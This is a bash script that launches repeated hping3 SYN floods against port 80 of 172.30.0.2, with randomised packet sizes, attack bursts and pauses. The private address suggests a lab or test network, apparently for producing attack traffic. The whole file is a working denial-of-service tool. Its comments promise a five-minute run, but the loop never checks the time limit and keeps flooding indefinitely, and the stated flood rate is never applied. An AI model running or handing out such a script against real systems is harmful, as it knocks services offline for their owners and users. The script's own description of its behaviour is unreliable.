#!/bin/bash

# DDoS payload script with random attack duration and packet size in a loop for 5 minutes
# Change target and port values as needed

TARGET_IP="172.30.0.2"         # Target IP Address
TARGET_PORT="80"               # Target Port (e.g., HTTP port)
MIN_PACKET_SIZE=50            # Minimum packet size in bytes
MAX_PACKET_SIZE=150           # Maximum packet size in bytes
FLOOD_RATE="1000"              # Packets per second
MAX_LOOP_TIME=300             # Total loop duration in seconds (5 minutes)

START_TIME=$(date +%s)         # Store the start time in seconds
CURRENT_TIME=$START_TIME       # Initialize current time variable

while [ true ]; do
    # Randomly select a packet size within the given range
    RANDOM_PACKET_SIZE=$(shuf -i $MIN_PACKET_SIZE-$MAX_PACKET_SIZE -n 1)

    # Randomly select attack duration based on categories
    ATTACK_CATEGORY=$(shuf -e short mid long -n 1)

    if [ "$ATTACK_CATEGORY" == "short" ]; then
        ATTACK_DURATION=$(shuf -i 1-10 -n 1)   # Short attack (1-10 seconds)
    elif [ "$ATTACK_CATEGORY" == "mid" ]; then
        ATTACK_DURATION=$(shuf -i 20-50 -n 1)   # Mid attack (20-50 seconds)
    else
        ATTACK_DURATION=$(shuf -i 50-100 -n 1)  # Long attack (50-100 seconds)
    fi

    echo "Starting DDoS attack on $TARGET_IP:$TARGET_PORT"
    echo "Random Packet Size: $RANDOM_PACKET_SIZE bytes"
    echo "Attack Duration: $ATTACK_DURATION seconds"
    echo "Flood rate: $FLOOD_RATE packets per second"

    # Using hping3 to generate the SYN flood attack with a random packet size
    hping3 --flood --syn -p $TARGET_PORT -d $RANDOM_PACKET_SIZE $TARGET_IP &
    sleep $ATTACK_DURATION
    killall hping3
    echo "Attack completed. $ATTACK_DURATION seconds of flooding with packet size $RANDOM_PACKET_SIZE bytes."
    
    # Sleep for a random time between 5 to 15 seconds before starting the next attack
    RANDOM_WAIT_TIME=$(shuf -i 5-15 -n 1)
    echo "Waiting for $RANDOM_WAIT_TIME seconds before next attack..."
    sleep $RANDOM_WAIT_TIME

    CURRENT_TIME=$(date +%s)  # Update the current time
done

echo "5 minutes of attacks completed."

